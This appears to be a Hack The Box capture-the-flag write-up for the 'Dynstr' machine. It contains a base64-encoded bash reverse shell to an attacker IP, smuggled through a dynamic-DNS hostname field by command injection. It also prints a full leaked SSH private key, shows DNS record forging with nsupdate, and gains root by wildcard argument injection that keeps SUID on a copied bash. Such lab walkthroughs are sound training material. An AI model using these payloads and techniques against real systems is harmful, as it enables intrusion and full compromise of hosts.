![DYNSTR](banner.png)

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Initial Foothold

On the website we find some credentials:
```
    Username: dynadns
    Password: sndanyd
```

And some URL:
```
    dnsalias.htb
    dynamicdns.htb
    no-ip.htb
    dyna.htb
```

Let's add those to our hostfile.

Bruteforcing directories we find /nic/update.

Posting to it with the credentials we already have returns a `nochg` which means nochange:

![nochg](nochg.png)

Googling what's happening here we find this website: https://www.noip.com/integrate/request

Let's craft a request to see if we can make it work here:

![good](good.png)


## User

Let's see if we can FUZZ it:

![nsupdate](nsupdate.png)

It seems like nsupdate is called and it fails so maybe we can inject some code here:

First we need our reverseshell like this:
```
bash -i &>/dev/tcp/10.10.14.52/4444 0>&1
```
We encode it to base64 to get something like this:
```
YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUyLzQ0NDQgMD4mMQ==

```

Now let's change our POST to inject the code:

Set the `hostname` to 
```
`echo "YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUyLzQ0NDQgMD4mMQ==" | base64 -d | bash`"dynadns.no-ip.htb
[20:02]
```
![injection](injection.png)

And use a netcat listener

![nc](nc.png)

We find the user.txt in /home/bindmgr/

## Root

Linpeas.sh finds some interesting files:
```
Possible private SSH keys were found!
/home/bindmgr/support-case-C62796521/strace-C62796521.txt
/home/bindmgr/support-case-C62796521/C62796521-debugging.script
```

Let's extract the SSH Key:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

And have a look at authorized_keys

```
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

Seems like it only accepts connections from `*.infra.dyna.htb`.
Luckily we can change that:

```
nsupdate -k /etc/bind/infra.key
update add hexp.infra.dyna.htb 86400 A 10.10.14.52
```
For some reason it is important to hit ENTER twice here.
Then write:
```
update add 52.14.10.10.in-addr.arpa 300 PTR hexp.infra.dyna.htb
send
```

We can now login via ssh and our extracted ssh-key id_rsa
```
ssh -i id_rsa bindmgr@10.129.48.120
```

Let's do basic enumeration:
```
bindmgr@dynstr:/tmp$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

Interesting we can execute some script as sudo. What's inside of it?

```
bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh
```
First the script checks if there is a .version file:
```bash
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
```
So let's create one:
```
touch .version
```
It then continues to check the version inside of it:
```bash
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi
```
So let's make it very high, to ensure ours is the "newest":
```
echo "200" > .version
```
Later the script copies a lot of files using the wildcard *
```bash
# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/
```

Which is a security risk. We can abuse this by copying bash to our current location:
```
cp /bin/bash .
```
give it our SUID:
```
chmod +s bash
```
and then create this file:
```
echo "" > --preserve=mode
```

If we execute our script now as sudo, it intereprets the filename --preserve=mode as a parameter and not as a filename because of the * wildcard being used. In this case it will cause the SUID to be kept while copying.

```
sudo /usr/local/bin/bindmgr.sh
```

Now we can cd to /etc/bind/named.bindmgr/ and see our SUID still being set:

![SUID](SUID.png)

We can now run bach with the -p parameter

![bash](bash.png)

```
./bash -p
#whoami
root
```
